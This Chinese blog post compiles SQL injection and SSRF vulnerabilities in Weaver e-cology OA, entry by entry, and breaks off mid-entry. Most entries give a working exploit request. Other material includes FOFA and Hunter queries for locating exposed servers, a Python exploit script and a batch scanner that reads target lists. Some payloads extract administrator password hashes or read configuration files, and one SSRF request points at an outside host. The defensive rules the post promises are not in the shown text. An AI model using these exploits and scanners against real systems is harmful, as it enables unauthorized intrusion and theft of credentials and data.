#  泛微SQL注入漏洞最全收集与整理  
原创 simeon的文章  小兵搞安全   2025-07-04 12:27  
  
##     某微的漏洞有些多，今天抽时间把其存在的sql注入漏洞全部进行整理，方便大家进行漏洞排查，文末整理了识别来自泛微sql注入的url地址及防护规则。  
## 2.1. SQL注入漏洞  
### 2.1.1泛微OA WorkflowCenterTreeData SQL注入漏洞  
  
1.漏洞描述  
  
2019年10月10日CNVD发布了泛微e-cology OA系统存在SQL注入漏洞。该漏洞是由于OA系统的WorkflowCenterTreeData接口中涉及Oracle数据库的SQL语句缺乏安全检查措施所导致的，任意攻击者都可借SQL语句拼接时机注入恶意payload，造成SQL注入攻击。  
  
2.影响版本  
  
使用Oracle数据库的泛微服务  
  
3.漏洞复现  
  
泛型微生态OA系统的WorkflowCenterTreeData接口在使用Oracle数据库时，由于内置sql语句分解不严密，导致其存在的sql注入漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VEahET4D9upp71ocVSgPzGCFTKFo85DYRJibeVBk3pMXWsWaZkhvevRN81uCiaZCxnCZXQ53y492Kzw/640?wx_fmt=png&from=appmsg "")  
  
漏洞请求包  
```
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
Host: ip:port
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 2236
Upgrade-Insecure-Requests: 1

formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1
```  
  
4.漏洞POC  
```
import requests
import sys

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def exploit(url):
    target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333'
    payload="formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"
    res=requests.post(url=target,data=payload,headers=headers,timeout=10)
    res.encoding=res.apparent_encoding
    print(res.text)

if __name__ == '__main__':
    url=sys.argv[1]
    exploit(url)
```  
- 参考文章  
泛微OA WorkflowCenterTreeData接口注入复现（仅限oracle数据库）  
### 2.1.2泛微OA E-Cology getSqlData SQL注入漏洞  
  
1.漏洞描述  
  
泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。  
  
2.漏洞影响  
  
泛微e-cology 8.0  
  
3.FOFA  
  
app="泛微-协同办公OA"  
  
4.漏洞复现  
  
登录页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VEahET4D9upp71ocVSgPzGCmHShpZYlXDFdwibSoZHZ8TVkkcRrKMI9gicu40qxOgtibfG9r58w5Z3Ig/640?wx_fmt=png&from=appmsg "")  
  
5.验证POC  
  
/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version  
### 2.1.3泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)  
  
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology9系统WorkPlanService前台存在SQL注入漏洞。  
  
1.fofa  
  
app="泛微-协同商务系统"  
  
2.hunter  
  
app.name=="泛微 e-cology 9.0 OA"  
  
3.poc  
  
  
POST /services/WorkPlanService HTTP/1.1  
  
HOST:   
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36  
  
Content-Type: text/xml;charset=UTF-8  
  
Connection: close  
  
  
<soapenv:Envelope xmlns:soapenv="  
http://schemas.xmlsoap.org/soap/envelope/"  
 xmlns:web="webservices.workplan.weaver.com.cn">  
  
    <soapenv:Header/>  
  
      <soapenv:Body>  
  
      <web:deleteWorkPlan>  
  
         <!--type: string-->  
  
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>  
  
         <!--type: int-->  
  
         <web:in1>22</web:in1>   
  
      </web:deleteWorkPlan>  
  
      </soapenv:Body>  
  
</soapenv:Envelope>  
  
### 2.1.4泛微e-cology9系统接口FileDownloadLocation接口存在SQL注入漏洞  
  
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology 9 x.FileDownloadLocation接口存在SQL注入漏洞  
  
1.fofa  
  
body="doCheckPopupBlocked"  
  
2.poc  
```
GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.0.0 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VEahET4D9upp71ocVSgPzGCtn6EhvAeb5G3lTqBZIjPhMIDZI9jNkq3ZM22NYYfZhR1KxxibUHicBAA/640?wx_fmt=png&from=appmsg "")  
  
  
### 2.1.5泛微ecology9系统接口ModeDateService存在SQL漏洞  
  
泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology9系统ModeDateService存在SQL注入漏洞。  
  
1.fofa  
  
app="泛微-协同商务系统"  
  
2.hunter  
  
app.name=="泛微 e-cology 9.0 OA"  
  
3.poc  
```
POST /services/ModeDateService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx//services/Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xxx 
Content-Length: 405

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
   <soapenv:Header/>   
   <soapenv:Body>
      <mod:getAllModeDataCount>
        <mod:in0>1</mod:in0>         
        <mod:in1>1</mod:in1>         
        <mod:in2>1=1</mod:in2>         
        <mod:in3>1</mod:in3>
      </mod:getAllModeDataCount>
  </soapenv:Body>
</soapenv:Envelope>
```  
  
漏洞来源  
- [https://mp.weixin.qq.com/s/2UkeRDbGaW0JGNQLfGSkRw](https://mp.weixin.qq.com/s?__biz=MzkxNjQyMjcwMw==&mid=2247486430&idx=1&sn=9df67b67bf5cd9e8b6554714bef7d21f&scene=21#wechat_redirect)  
  
### 2.1.6泛微E-cology LoginSSO.jsp存在QL注入漏洞  
  
泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。  
(CNVD-2021-33202)  
  
1.fofa  
  
app="泛微-协同办公OA"  
  
2.poc  
  
/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager  
### 2.1.7泛微 HrmCareerApplyPerView.jsp sql注入漏洞  
  
GET  
  
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1  
  
Host: 127.0.0.1:7443  
  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)  
  
Accept-Encoding: gzip, deflate  
  
Connection: close  
### 2.1.8泛微e-cology9_SQL注入-CNVD-2023-12632  
  
1.影响版本  
  
泛微e-cology V9<10.56  
  
2.fofa  
  
app="泛微-协同商务系统"  
  
3.poc  
```
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 649

isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%34%25%33%35%25%32%35%25%33%34%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37
```  
  
payload需要经过三次url编码，文末附tamper脚本地址  
  
4.  
批量检测脚本  
```
import argparse
import requests
from termcolor import colored
import signal

# Disable SSL certificate verification
requests.packages.urllib3.disable_warnings()

output_file = None  # 全局变量


def check_url(url, output=None):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    data = {
        "isDis": "1",
        "browserTypeId": "269",
        "keyword": "%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%32%37%25%32%62%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%39%25%32%62%25%32%37"
    }

    try:
        modified_url = url + '/mobile/%20/plugin/browser.jsp'
        response = requests.post(modified_url, data=data, headers=headers, verify=False, timeout=3)
        content = response.text

        if "show2" in content:
            result = colored(url + " 存在", 'red')

            if output:
                with open(output, 'a') as file:  # 以追加模式打开文件
                    file.write(url + '\n')

            print(result)  # 即时打印结果
        else:
            result = url + " 不存在"
            print(result)  # 即时打印结果

    except requests.exceptions.RequestException as e:
        pass  # 不进行任何操作，直接请求下一个URL


def check_urls_from_file(filename, output=None):
    with open(filename, 'r') as file:
        url_list = file.read().strip().split('\n')

    for url in url_list:
        check_url(url, output)

        # 捕获中断信号
        signal.signal(signal.SIGINT, handle_interrupt)


def handle_interrupt(signum, frame):
    global output_file

    # 在捕获中断时保存当前扫描结果，并关闭文件
    if output_file:
        output_file.close()

    print("\n扫描已中断并保存当前结果。")
    exit()


def main():
    global output_file

    parser = argparse.ArgumentParser(description='CNVD-2023-12632检测POC')
    parser.add_argument('-u', '--url', help='检测单个URL')
    parser.add_argument('-r', '--file', help='从文本中批量检测URL')
    parser.add_argument('-o', '--output', help='将检测到的输出到文本中')
    args = parser.parse_args()

    if args.output:
        output_file = open(args.output, 'a')  # 以追加模式打开输出文件

    if args.url:
        check_url(args.url, args.output)
    elif args.file:
        check_urls_from_file(args.file, args.output)
    else:
        parser.print_help()

    # 注册捕获中断信号的处理程序
    signal.signal(signal.SIGINT, handle_interrupt)

    # 关闭输出文件
    if output_file:
        output_file.close()


if __name__ == '__main__':
    author_name = "-----------------------------========================== SharpKean"
    print("Author：", author_name)
    main()
```  
  
脚本来源  
- https://github.com/SharpKean/CNVD-2023-12632_POC  
- https://github.com/ChinaRan0/3url  
### 2.1.9泛微E-Cology9平台QRcodeBuildAction存在身份认证绕过导致SQL注入漏洞  
  
由于泛微E-Cology9 weaver.formmode.servelt.QRcodeBuildAction接口未对用户传入的数据进行严格的校验和过滤，导致攻击者利用多层编码的方式绕过身份认证进行SQL注入。  
  
1.fofa  
  
 app="泛微-OA（e-cology）"  
  
2.poc  
  
注入点为modeid并且每注入一次就需要更换参数值  
```
POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

modeid=127+WAITFOR+DELAY+'0%3a0%3a5'
```  
  
sqlmap利用方式：  
https://blog.csdn.net/qq_41904294/article/details/131666128  
### 2.1.10泛微E-Cology接口getFileViewUrl存在SSRF漏洞  
  
泛微E-Cology getFileViewUrl 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。  
- fofa  
app="泛微-OA（e-cology）"  
- poc  
```
POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Upgrade-Insecure-Requests: 1

{
    "file_id": "1000",
    "file_name": "c",
    "download_url":"http://euixlkewfg.dgrh3.cn"
}
```  
- afrog poc  
```
id: 泛微E-Cology接口getFileViewUrl存在SSRF漏洞

info:
  name: 泛微E-Cology接口getFileViewUrl存在SSRF漏洞
  author: wy876
  severity: high
  verified: true
  description: |-
    泛微E-Cology getFileViewUrl 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。
    Fofa: app="泛微-OA（e-cology）"

  reference:
    - https://blog.csdn.net/qq_41904294/article/details/140301289
  tags: 泛微,ssrf
  created: 2024/07/10

set:
  oob: oob()
  oobHTTP: oob.HTTP
  oobDNS: oob.DNS

rules:
  r0:
    request:
      method: POST
      path: /api/doc/mobile/fileview/getFileViewUrl
      headers:
        Content-Type: application/json
      body: |
        {"file_id": "1000","file_name": "c","download_url":"{{oobHTTP}}"}
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)

expression: r0()
```  
### 2.1.11泛微e-cology接口getLabelByModule存在sql注入漏洞  
- fofa  
app="泛微-E-Weaver"  
- poc  
```
GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+-- HTTP/1.1
Host: {}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=utf-8Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
  
  
POST /services/HrmService HTTP/1.1  
  
Upgrade-Insecure-Requests: 1  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
  
Accept-Encoding: gzip, deflate, br  
  
Connection: close  
  
SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo  
  
Content-Type: text/xml;charset=UTF-8  
  
Host:   
  
Content-Length: 427  
  
  
<soapenv:Envelope xmlns:soapenv="  
http://schemas.xmlsoap.org/soap/envelope/"  
 xmlns:hrm="  
http://localhost/services/HrmService">  
  
   <soapenv:Header/>  
  
   <soapenv:Body>  
  
      <hrm:getHrmDepartmentInfo>  
  
         <!--type: string-->  
  
         <hrm:in0>gero et</hrm:in0>  
  
         <!--type: string-->  
  
         <hrm:in1>1)AND(db_name()like'ec%'</hrm:in1>  
  
      </hrm:getHrmDepartmentInfo>  
  
   </soapenv:Body>  
  
</soapenv:Envelope>  
  
### 2.1.12泛微ecology系统接口BlogService存在SQL注入漏洞  
  
泛微ecology系统接口/services/BlogService  
存在SQL注入漏洞  
- fofa  
app="泛微-OA（e-cology）"  
- poc  
```
POST /services/BlogService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.3.139
Content-Length: 493

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:writeBlogReadFlag>
         <web:string>1</web:string>
         <web:string>注入点</web:string>
         <web:string></web:string>
      </web:writeBlogReadFlag>
   </soapenv:Body>
</soapenv:Envelope>
```  
```
POST /services/BlogService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.3.139
Content-Length: 469

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:sendSubmitRemind>
         <!--type: string-->
         <web:in0>1</web:in0>
         <!--type: string-->
         <web:in1>2</web:in1>
         <!--type: string-->
         <web:in2>注入点</web:in2>
      </web:sendSubmitRemind>
   </soapenv:Body>
</soapenv:Envelope>
```  
- 漏洞来源  
- [https://mp.weixin.qq.com/s/4mJg0FuOOIBjZn-qTMSaeA](https://mp.weixin.qq.com/s?__biz=Mzg5MjY2NTU4Mw==&mid=2247486033&idx=1&sn=37f9ab5a775d8bfbb11cb6bed7a07e03&scene=21#wechat_redirect)  
  
### 2.1.13泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞  
  
泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞，可获取数据库权限，导致数据泄露。  
- fofa  
app="泛微-OA（e-cology）"  
- poc  
```
